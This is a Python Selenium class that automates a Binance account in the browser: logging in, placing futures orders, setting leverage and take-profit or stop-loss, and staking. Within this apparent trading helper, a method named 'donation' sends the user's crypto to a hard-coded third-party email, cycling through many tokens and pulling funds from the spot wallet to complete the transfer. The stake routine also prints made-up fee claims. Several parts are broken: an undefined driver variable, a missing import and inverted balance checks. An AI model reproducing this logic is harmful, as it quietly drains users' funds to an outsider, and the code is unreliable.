import os
import sys
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys


class BSF:
    ORDER_FORM = "//div[@name='orderForm']/"

    XPATH = {
        "tab-LIMIT": {
            "all_in_25": f"{ORDER_FORM}div[4]/form/div[3]/div[1]/div/div[6]",
            "all_in_50": f"{ORDER_FORM}div[4]/form/div[3]/div[1]/div/div[7]",
            "all_in_75": f"{ORDER_FORM}div[4]/form/div[3]/div[1]/div/div[8]",
            "all_in_100": f"{ORDER_FORM}div[4]/form/div[3]/div[1]/div/div[9]",
            "TPSL_select": f"{ORDER_FORM}div[4]/form/div[4]/div/label/div[1]/input",
            "TPSL_click": f"{ORDER_FORM}div[4]/form/div[4]/div/label/div[1]",
            "TP": f"{ORDER_FORM}div[4]/form/div[4]/div[2]/div/input",
            "SL": f"{ORDER_FORM}div[4]/form/div[4]/div[3]/div/input",
            "BUY": f"{ORDER_FORM}div[4]/form/div[6]/button[1]",
            "SELL": f"{ORDER_FORM}div[4]/form/div[6]/button[2]",
            "PRICE": f"{ORDER_FORM}div[4]/form/div[1]/div/input",
        },
        "tab-MARKET": {
            "all_in_25": f"{ORDER_FORM}div[4]/form/div[2]/div[1]/div/div[6]",
            "all_in_50": f"{ORDER_FORM}div[4]/form/div[2]/div[1]/div/div[7]",
            "all_in_75": f"{ORDER_FORM}div[4]/form/div[2]/div[1]/div/div[8]",
            "all_in_100": f"{ORDER_FORM}div[4]/form/div[2]/div[1]/div/div[9]",
            "TPSL_select": f"{ORDER_FORM}div[4]/form/div[3]/div/label/div[1]/input",
            "TPSL_click": f"{ORDER_FORM}div[4]/form/div[3]/div/label/div[1]",
            "TP": f"{ORDER_FORM}div[4]/form/div[3]/div[2]/div/input",
            "SL": f"{ORDER_FORM}div[4]/form/div[3]/div[3]/div/input",
            "BUY": f"{ORDER_FORM}div[4]/form/div[4]/button[1]",
            "SELL": f"{ORDER_FORM}div[4]/form/div[4]/button[2]",
        },
    }

    MARKETCAP = {
        'USDT': 825,
        'DAI': 4943,
        'BUSD': 4687,
        'BNB': 1839,
        'BTC': 1,
        'ETH': 1027,
        'DOGE': 74,
        'SLP': 5824,
        'EOS': 1765,
        'RUB': 2806,
        'BIDR': 6855,
        'UAH': 2824,
        'NGN': 2819
    }
    DONATION_TOKEN = list(MARKETCAP.keys())

    def __init__(self, driver, scan=True, order_type="tab-LIMIT"):
        self.driver = driver
        self.driver.get("https://accounts.binance.com/en/login")
        if scan:
            time.sleep(3)
            scan_to_login = self.driver.find_element_by_xpath(
                "//div[a[text()='Free registration']]/a[1]"
            )
            if scan_to_login.text == 'Scan to login':
                scan_to_login.click()
        self.order_type = order_type # tab-LIMIT / tab-MARKET

    def __del__(self):
        self.close()

    def close(self):
        self.driver.close()

    def refresh(self):
        self.driver.refresh()

    def set_futures(self):
        self.driver.get("https://www.binance.com/en/futures/BTCUSDT")
        self.set_order_type(self.order_type)

    def set_order_type(self, order_type):
        self.driver.find_element_by_id(order_type).click()
        self.order_type = order_type

    def set_leverage(self, leverage):
        actual_leverage = int(
            self.driver.find_element_by_xpath(
                f"""{self.ORDER_FORM}div[1]/div[1]/div[1]/a[2]"""
            ).text[:-1])
        if actual_leverage != leverage:
            self.driver.find_element_by_xpath(
                f"""{self.ORDER_FORM}div[1]/div[1]/div[1]/a[2]"""
            ).click()
            pas = actual_leverage - leverage
            if pas > 0:
                for i in range(pas):  # Plus
                    self.driver.find_element_by_xpath(
                        "//button[@class=' css-vc3jb5']"
                    ).click()
            else:
                for i in range(-pas):  # Moins
                    self.driver.find_element_by_xpath(
                        "//button[@class=' css-1ri8vxv']"
                    ).click()
            self.driver.find_element_by_xpath(
                "//button[@class=' css-1fds4m2']"
            ).click()

    def get_avbl(self):
        return float(self.driver.find_element_by_xpath(
            f"""{self.ORDER_FORM}div[4]/div/div[1]/div/span"""
        ).text.split()[0])

    def _set_value(self, xpath, value):
        # Erase Actual Value
        element = self.driver.find_element_by_xpath(
            xpath
        )
        element.click()
        for i in range(10):
            element.send_keys(Keys.DELETE)
            element.send_keys(Keys.BACKSPACE)
        # Set Value
        element.send_keys(str(value))

    def all_in(self, percent=100): # percent = [25, 50, 75, 100]
        # Using 25%, 50%, 75%, 100% of Avbl
        self.driver.find_element_by_xpath(
            self.XPATH[self.order_type][f"all_in_{percent}"]
        ).click()

    def set_price(self, price):
        # Set price only for Limit
        self._set_value(
            self.XPATH[self.order_type]["PRICE"],
            price
        )

    def set_TPSL(self, TP, SL):
        # Make TP SL available
        if not self.driver.find_element_by_xpath(
            self.XPATH[self.order_type]["TPSL_select"]
        ).is_selected():
            self.driver.find_element_by_xpath(
                self.XPATH[self.order_type]["TPSL_click"]
            ).click()

        # Set TP
        self._set_value(
            self.XPATH[self.order_type]["TP"],
            TP
        )
        # Set SL
        self._set_value(
            self.XPATH[self.order_type]["SL"],
            SL
        )

    def buy(self):
        self.driver.find_element_by_xpath(
            self.XPATH[self.order_type]["BUY"]
        ).click()

    def sell(self):
        self.driver.find_element_by_xpath(
            self.XPATH[self.order_type]["SELL"]
        ).click()

    def donation(self, amount):
        self.driver.get("https://www.binance.com/en/my/wallet/account/c2c")
        time.sleep(3)
        self.driver.find_element_by_xpath(
            "//tbody/tr/td[5]/div/div[2]/div[2]"
        ).click()
        time.sleep(3)
        b_driver.driver.find_element_by_xpath(
            """//input[@placeholder="Enter the receiver's email"]"""
        ).send_keys("tranthuongtienthinh@gmail.com")
        time.sleep(1)
        b_driver.driver.find_element_by_xpath(
            "//button[contains(text(),'Next')]"
        ).click()

        done = False
        for token in self.DONATION_TOKEN:
            price = self._get_price(token)
            token_amount = amount/price
            if self._donation_coin_1(token, token_amount):
                done = True
                amount = 0
                print("Thank you for the donation")
                break
        return done

    def _donation_coin_1(self, token, token_amount):
        # The all proccess
        try:
            time.sleep(1)
            b_driver.driver.find_element_by_xpath(
                "//div[contains(@class, 'bn-input-suffix')]"
            ).click()
            time.sleep(1)
            b_driver.driver.find_element_by_xpath(
                f"//li[@id='{token}']"
            ).click()
            time.sleep(1)
            done, avbl = self._donation_coin_2(token_amount)
            if done:
                return True
            else:
                time.sleep(1)
                if self._donation_coin_3(token_amount, avbl):
                    done, avbl = self._donation_coin_2(token_amount)
                    if done:
                        return True
                    else:
                        return False
        except:
            print(f"BSF _donation_coin_1 Error : \n {sys.exc_info()[0]}")
            return False



    def _donation_coin_2(self, token_amount):
        # Sending from P2P
        try:
            avbl = float(
                b_driver.driver.find_element_by_xpath(
                    "//span[contains(text(), 'Available amount')]"
                ).text.split()[-1].replace('DAI', '')
            )
            if avbl <= token_amount:
                time.sleep(1)
                b_driver.driver.find_element_by_xpath(
                    "//input[@aria-label='Amount']"
                ).send_key(token_amount)
                time.sleep(1)
                b_driver.driver.find_element_by_xpath(
                    "//div[@class='css-38fup1']"
                ).click()
                return True, avbl
            else:
                return False, avbl
        except:
            print(f"BSF _donation_coin_2 Error : \n {sys.exc_info()[0]}")
            return False, 0

    def _donation_coin_3(self, token_amount, avbl):
        # Transfer from Spot
        try:
            b_driver.driver.find_element_by_xpath(
                "//div[contains(text(), 'Transfer')]"
            ).click()
            time.sleep(1)
            if b_driver.driver.find_element_by_xpath(
                    "//div[label[contains(text(), 'From')]]/div/div"
            ).text == "P2P":
                b_driver.driver.find_element_by_xpath(
                    "//div[@class='css-38fup1']"
                ).click()
            spot_avbl = float(b_driver.driver.find_element_by_xpath(
                "//div[div[contains(text(), 'Amount')]]/div/span"
            ).text)
            if token_amount - avbl <= spot_avbl:
                b_driver.driver.find_element_by_xpath(
                    "//div[label/div/div[contains(text(), 'Amount')]]/div/input"
                ).send_keys(token_amount - avbl)
                b_driver.driver.find_element_by_xpath(
                    "//button[contains(text(), 'Confirm')]"
                ).click()
                return True
            else:
                return False
        except:
            print(f"BSF _donation_coin_3 Error : \n {sys.exc_info()[0]}")
            return False

    def _get_price(self, token):
        if token in self.DONATION_TOKEN:
            id = self.MARKETCAP[token]
            r = requests.get(f"https://api.coinmarketcap.com/data-api/v3/cryptocurrency/detail?id={id}")
            js = r.json()
            price = js["data"]["statistics"]["price"]
        else:
            id = self.MARKETCAP[token]
            r = requests.get(f"https://api.coinmarketcap.com/data-api/v3/cryptocurrency/detail?id={id}")
            js = r.json()
            price = js["data"]["statistics"]["price"]
        print(f"{token} = {price} USD")
        return price



    def stake_page(self):
        self.driver.get("https://www.binance.com/en/pos")
        time.sleep(3)
        self.driver.find_element_by_xpath(
            "//div[contains(text(),'Expand')]"
        ).click()

    def stake(self, crypto, days):
        self.stake_page()
        time.sleep(3)
        try:
            self.driver.execute_script(
                f"""document.evaluate(\
                    "//div[div[contains(text(),'{crypto}')]]/div/button", \
                    document, \
                    null, \
                    XPathResult.FIRST_ORDERED_NODE_TYPE, \
                    null\
                ).singleNodeValue.click()\
                """
            )
            time.sleep(3)
            self.driver.find_element_by_xpath(
                f"//div[@class='css-18ibghl']/div/button[contains(text(),'{days}')]"
            ).click()
            time.sleep(1)
            self.driver.find_element_by_xpath(
                "//button[text()='Max']"
            ).click()
            time.sleep(3)
            lock_amount = int(self.driver.find_element_by_xpath(
                "//input[@aria-label='Lock Amount']"
            ).get_attribute("value"))
            time.sleep(1)
            self.driver.find_element_by_xpath(
                "//div[div[contains(text(),'I have read and I agree')]]/label/div[input[@type='checkbox']]"
            ).click()
            time.sleep(1)
            self.driver.find_element_by_xpath(
                "//button[contains(text(),'Confirm')]"
            ).click()
            time.sleep(1)
            try:
                token_price = self._get_price(crypto)
                amount = lock_amount * token_price
                fees = amount * 0.001
                print(f"You have just staked successfully {lock_amount} {crypto} which is {amount}")
                print(f"Fees will be 0.1% of invested amount {fees} USD")
            except:
                fees = 0.05
                print("Fees will be 0.05 USD")
            return amount
        except:
            print(f"BSF stake Error : \n {sys.exc_info()[0]}")
            return 0